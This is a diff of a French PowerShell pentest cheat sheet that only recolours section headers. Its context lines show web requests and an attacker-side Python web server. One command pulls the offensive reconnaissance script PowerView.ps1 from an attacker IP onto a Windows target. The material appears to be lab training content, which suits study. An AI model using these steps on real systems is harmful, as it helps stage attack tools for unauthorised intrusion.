@@ -14,7 +14,7 @@
 
 ### <mark style="color:blue;">📥 TÉLÉCHARGER DES FICHIERS</mark>
 
-#### Méthode 1 : Invoke-WebRequest (Recommandée)
+#### <mark style="color:green;">Méthode 1 : Invoke-WebRequest (Recommandée)</mark>
 
 ```powershell
 # Télécharger depuis Internet
@@ -47,7 +47,7 @@ Invoke-WebRequest -Uri "<URL_DU_FICHIER>" -OutFile "<DESTINATION>"
 
 ### <mark style="color:blue;">🔍 REQUÊTES WEB</mark>
 
-#### Requête GET Simple
+#### <mark style="color:green;">Requête GET Simple</mark>
 
 ```powershell
 # Requête de base
@@ -57,7 +57,7 @@ Invoke-WebRequest -Uri "https://example.com" -Method GET
 Invoke-WebRequest -Uri "https://example.com" -Method GET | Get-Member
 ```
 
-#### Filtrer le Contenu
+#### <mark style="color:green;">Filtrer le Contenu</mark>
 
 ```powershell
 # Voir seulement les images
@@ -77,14 +77,14 @@ Invoke-WebRequest -Uri "https://example.com" -Method GET | fl Forms
 
 ### <mark style="color:blue;">🖥️ SERVEUR WEB PYTHON (Côté Attaquant)</mark>
 
-#### Démarrer un serveur web simple
+#### <mark style="color:green;">Démarrer un serveur web simple</mark>
 
 ```bash
 # Depuis votre machine d'attaque Linux
 python3 -m http.server 8000
 ```
 
-#### Télécharger depuis ce serveur
+#### <mark style="color:green;">Télécharger depuis ce serveur</mark>
 
 ```powershell
 # Depuis la cible Windows
@@ -93,7 +93,7 @@ Invoke-WebRequest -Uri "http://10.10.14.169:8000/PowerView.ps1" -OutFile "C:\Pow
 
 ***
 
-### 📊 PROPRIÉTÉS UTILES
+### <mark style="color:green;">📊 PROPRIÉTÉS UTILES</mark>
 
 Quand vous faites une requête web, vous pouvez accéder à :
 
